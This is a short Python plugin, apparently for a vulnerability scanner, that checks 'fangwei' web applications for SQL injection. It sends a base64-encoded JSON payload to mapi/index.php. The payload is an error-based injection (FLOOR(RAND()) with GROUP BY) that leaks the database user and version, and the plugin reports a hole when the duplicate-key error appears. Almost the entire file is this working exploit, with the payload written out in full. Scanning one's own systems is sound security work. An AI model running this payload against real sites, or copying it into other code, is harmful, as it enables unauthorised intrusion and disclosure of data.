#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service,arg):
    if service == "fangwei":
        return True, arg

def audit(arg):
	payload = "mapi/index.php?requestData=eyJrZXl3b3JkIjoiJykgQU5EIChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoKFNFTEVDVCBTVUJTVFJJTkcoQ09OQ0FUKHVzZXIoKSwweDdjLHZlcnNpb24oKSwweDdjKSwxLDYwKSksRkxPT1IoUkFORCgwKSoyKSlYIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBHUk9VUCBCWSBYKWEpIyIsImFjdCI6Im5lYXJieWdvb2RzZXMifQ=="
	code, head, res, errcode,finalurl =  curl.curl("\"%s\"" % (arg + payload))

	if code == 200:
		if "for key 'group_key'" in res:
			security_hole('find sql injection: ' + arg+'mapi/index.php')

if __name__ == "__main__":
	from dummy import *
	audit(assign('fangwei', 'http://www.example.com/')[1])